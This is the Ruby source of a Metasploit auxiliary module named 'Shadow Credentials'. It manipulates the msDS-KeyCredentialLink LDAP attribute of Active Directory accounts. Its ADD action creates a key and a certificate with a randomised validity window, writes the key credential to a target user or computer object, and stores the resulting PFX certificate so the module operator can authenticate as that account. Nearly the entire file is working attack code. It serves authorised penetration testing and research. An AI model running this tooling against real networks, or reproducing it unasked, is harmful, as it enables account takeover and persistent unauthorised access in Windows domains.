##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::LDAP
  include Msf::Auxiliary::Report

  ATTRIBUTE = 'msDS-KeyCredentialLink'.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Shadow Credentials',
        'Description' => %q{
          This module can read and write the necessary LDAP attributes to configure a particular account with a
          Key Credential Link. This allows weaponising write access to a user account by adding a certificate
          that can subsequently be used to authenticate. In order for this to succeed, the authenticated user
          must have write access to the target object (the object specified in TARGET_USER).
        },
        'Author' => [
          'Elad Shamir', # Original research
          'smashery' # module author
        ],
        'References' => [
          ['URL', 'https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab'],
          ['URL', 'https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials']
        ],
        'License' => MSF_LICENSE,
        'Actions' => [
          ['FLUSH', { 'Description' => 'Delete all certificate entries' }],
          ['LIST', { 'Description' => 'Read all credentials associated with the account' }],
          ['REMOVE', { 'Description' => 'Remove matching certificate entries from the account object' }],
          ['ADD', { 'Description' => 'Add a credential to the account' }]
        ],
        'DefaultAction' => 'LIST',
        'Notes' => {
          'Stability' => [],
          'SideEffects' => [CONFIG_CHANGES], # REMOVE, FLUSH, ADD all make changes
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('TARGET_USER', [ true, 'The target to write to' ]),
      OptString.new('DEVICE_ID', [ false, 'The specific certificate ID to operate on' ], conditions: %w[ACTION == REMOVE]),
    ])

    # Default authentication will be basic auth, which won't work on Windows LDAP servers; so overwrite default to NTLM
    register_advanced_options(
      [
        OptEnum.new('LDAP::Auth', [true, 'The Authentication mechanism to use', Msf::Exploit::Remote::AuthOption::NTLM, Msf::Exploit::Remote::AuthOption::LDAP_OPTIONS]),
      ]
    )
  end

  def fail_with_ldap_error(message)
    ldap_result = @ldap.get_operation_result.table
    return if ldap_result[:code] == 0

    print_error(message)
    # Codes taken from https://ldap.com/ldap-result-code-reference-core-ldapv3-result-codes
    case ldap_result[:code]
    when 1
      fail_with(Failure::Unknown, "An LDAP operational error occurred. The error was: #{ldap_result[:error_message].strip}")
    when 16
      fail_with(Failure::NotFound, 'The LDAP operation failed because the referenced attribute does not exist. Ensure you are targeting a domain controller running at least Server 2016.')
    when 50
      fail_with(Failure::NoAccess, 'The LDAP operation failed due to insufficient access rights.')
    when 51
      fail_with(Failure::UnexpectedReply, 'The LDAP operation failed because the server is too busy to perform the request.')
    when 52
      fail_with(Failure::UnexpectedReply, 'The LDAP operation failed because the server is not currently available to process the request.')
    when 53
      fail_with(Failure::UnexpectedReply, 'The LDAP operation failed because the server is unwilling to perform the request.')
    when 64
      fail_with(Failure::Unknown, 'The LDAP operation failed due to a naming violation.')
    when 65
      fail_with(Failure::Unknown, 'The LDAP operation failed due to an object class violation.')
    end

    fail_with(Failure::Unknown, "Unknown LDAP error occurred: result: #{ldap_result[:code]} message: #{ldap_result[:error_message].strip}")
  end

  def warn_on_likely_user_error(existing_entries: false)
    ldap_result = @ldap.get_operation_result.table
    if ldap_result[:code] == 50
      if (datastore['USERNAME'] == datastore['TARGET_USER'] ||
          datastore['USERNAME'] == datastore['TARGET_USER'] + '$') &&
         datastore['USERNAME'].end_with?('$') &&
         ['add', 'remove'].include?(action.name.downcase) &&
         existing_entries
        print_warning('By default, computer accounts can only update their key credentials if no value already exists. If there is already a value present, you can remove it, and add your own, but any users relying on the existing credentials will not be able to authenticate until you replace the existing value(s).')
      elsif datastore['USERNAME'] == datastore['TARGET_USER'] && !datastore['USERNAME'].end_with?('$')
        print_warning('By default, only computer accounts can modify their own properties (not user accounts).')
      end
    end
  end

  def ldap_get(filter, attributes: [])
    raw_obj = @ldap.search(base: @base_dn, filter: filter, attributes: attributes).first
    return nil unless raw_obj

    obj = {}

    obj['dn'] = raw_obj['dn'].first.to_s
    unless raw_obj['sAMAccountName'].empty?
      obj['sAMAccountName'] = raw_obj['sAMAccountName'].first.to_s
    end

    unless raw_obj['ObjectSid'].empty?
      obj['ObjectSid'] = Rex::Proto::MsDtyp::MsDtypSid.read(raw_obj['ObjectSid'].first)
    end

    unless raw_obj[ATTRIBUTE].empty?
      result = []
      raw_obj[ATTRIBUTE].each do |entry|
        dn_binary = Rex::Proto::LDAP::DnBinary.decode(entry)
        struct = Rex::Proto::MsAdts::KeyCredentialStruct.read(dn_binary.data)
        result.append(Rex::Proto::MsAdts::KeyCredential.from_struct(struct))
      end
      obj[ATTRIBUTE] = result
    end

    obj
  end

  def run
    ldap_connect do |ldap|
      validate_bind_success!(ldap)

      if (@base_dn = datastore['BASE_DN'])
        print_status("User-specified base DN: #{@base_dn}")
      else
        print_status('Discovering base DN automatically')

        unless (@base_dn = discover_base_dn(ldap))
          print_warning("Couldn't discover base DN!")
        end
      end
      @ldap = ldap

      target_user = datastore['TARGET_USER']
      obj = ldap_get("(sAMAccountName=#{target_user})", attributes: ['sAMAccountName', 'ObjectSID', ATTRIBUTE])
      if obj.nil? && !target_user.end_with?('$')
        obj = ldap_get("(sAMAccountName=#{target_user}$)", attributes: ['sAMAccountName', 'ObjectSID', ATTRIBUTE])
      end
      fail_with(Failure::NotFound, "Failed to find sAMAccountName: #{target_user}") unless obj

      send("action_#{action.name.downcase}", obj)
    end
  rescue Net::LDAP::Error => e
    print_error("#{e.class}: #{e.message}")
  end

  def action_list(obj)
    credential_entries = obj[ATTRIBUTE]
    if credential_entries.nil?
      print_status("The #{ATTRIBUTE} field is empty.")
      return
    end
    print_status('Existing credentials:')
    credential_entries.each do |credential|
      print_status("DeviceID: #{bytes_to_uuid(credential.device_id)} - Created #{credential.key_creation_time}")
    end
  end

  def action_remove(obj)
    credential_entries = obj[ATTRIBUTE]
    if credential_entries.nil? || credential_entries.empty?
      print_status("The #{ATTRIBUTE} field is empty. No changes are necessary.")
      return
    end

    length_before = credential_entries.length
    credential_entries.delete_if { |entry| bytes_to_uuid(entry.device_id) == datastore['DEVICE_ID'] }
    if credential_entries.length == length_before
      print_status('No matching entries found - check device ID')
    else
      update_list = credentials_to_ldap_format(credential_entries, obj['dn'])
      unless @ldap.replace_attribute(obj['dn'], ATTRIBUTE, update_list)
        warn_on_likely_user_error
        fail_with_ldap_error("Failed to update the #{ATTRIBUTE} attribute.")
      end
      print_good("Deleted entry with device ID #{datastore['DEVICE_ID']}")
    end
  end

  def action_flush(obj)
    unless obj[ATTRIBUTE]
      print_status("The #{ATTRIBUTE} field is empty. No changes are necessary.")
      return
    end

    unless @ldap.delete_attribute(obj['dn'], ATTRIBUTE)
      fail_with_ldap_error("Failed to deleted the #{ATTRIBUTE} attribute.")
    end

    print_good("Successfully deleted the #{ATTRIBUTE} attribute.")
  end

  def action_add(obj)
    credential_entries = obj[ATTRIBUTE]
    if credential_entries.nil?
      credential_entries = []
    end
    key, cert = generate_key_and_cert(datastore['TARGET_USER'])
    credential = Rex::Proto::MsAdts::KeyCredential.new
    credential.set_key(key.public_key, Rex::Proto::MsAdts::KeyCredential::KEY_USAGE_NGC)
    now = ::Time.now
    credential.set_times(now, now)
    credential_entries.append(credential)
    update_list = credentials_to_ldap_format(credential_entries, obj['dn'])

    unless @ldap.replace_attribute(obj['dn'], ATTRIBUTE, update_list)
      warn_on_likely_user_error(!credential_entries.length == 1)
      fail_with_ldap_error("Failed to update the #{ATTRIBUTE} attribute.")
    end

    pkcs12 = OpenSSL::PKCS12.create('', '', key, cert)
    store_cert(pkcs12)

    print_good("Successfully updated the #{ATTRIBUTE} attribute; certificate with device ID #{bytes_to_uuid(credential.device_id)}")
  end

  def store_cert(pkcs12)
    service_data = ldap_service_data
    credential_data = {
      **service_data,
      address: service_data[:host],
      port: rport,
      protocol: service_data[:proto],
      service_name: service_data[:name],
      workspace_id: myworkspace_id,
      username: datastore['TARGET_USER'],
      private_type: :pkcs12,
      # pkcs12 is a binary format, but for persisting we Base64 encode it
      private_data: Base64.strict_encode64(pkcs12.to_der),
      origin_type: :service,
      module_fullname: fullname
    }
    create_credential(credential_data)

    info = "#{datastore['DOMAIN']}\\#{datastore['TARGET_USER']} Certificate"
    stored_path = store_loot('windows.shadowcreds', 'application/x-pkcs12', rhost, pkcs12.to_der, 'certificate.pfx', info)
    print_status("Certificate stored at: #{stored_path}")
  end

  def ldap_service_data
    {
      host: rhost,
      port: rport,
      proto: 'tcp',
      name: 'ldap',
      info: "Module: #{fullname}, #{datastore['LDAP::AUTH']} authentication"
    }
  end

  def credentials_to_ldap_format(entries, dn)
    entries.map do |entry|
      struct = entry.to_struct
      dn_binary = Rex::Proto::LDAP::DnBinary.new(dn, struct.to_binary_s)

      dn_binary.encode
    end
  end

  def bytes_to_uuid(bytes)
    # Convert each byte to a 2-digit hexadecimal string
    hex_strings = bytes.bytes.map { |b| b.to_s(16).rjust(2, '0') }

    # Arrange the hex strings in the correct order for UUID format
    uuid_parts = [
      hex_strings[0..3].reverse.join,  # First 4 bytes (little-endian)
      hex_strings[4..5].reverse.join,  # Next 2 bytes (little-endian)
      hex_strings[6..7].reverse.join,  # Next 2 bytes (little-endian)
      hex_strings[8..9].join,  # Next 2 bytes (big-endian)
      hex_strings[10..15].join # Last 6 bytes (big-endian)
    ]

    # Join the parts with hyphens to form the complete UUID
    uuid = uuid_parts.join('-')

    return uuid
  end

  def generate_key_and_cert(subject)
    key = OpenSSL::PKey::RSA.new(2048)
    cert = OpenSSL::X509::Certificate.new
    cert.public_key = key.public_key
    cert.issuer = OpenSSL::X509::Name.new([['CN', subject]])
    cert.subject = OpenSSL::X509::Name.new([['CN', subject]])
    yr = 24 * 3600 * 365
    cert.not_before = Time.at(Time.now.to_i - rand(yr * 3) - yr)
    cert.not_after = Time.at(cert.not_before.to_i + (rand(4..9) * yr))
    cert.sign(key, OpenSSL::Digest.new('SHA256'))

    [key, cert]
  end
end
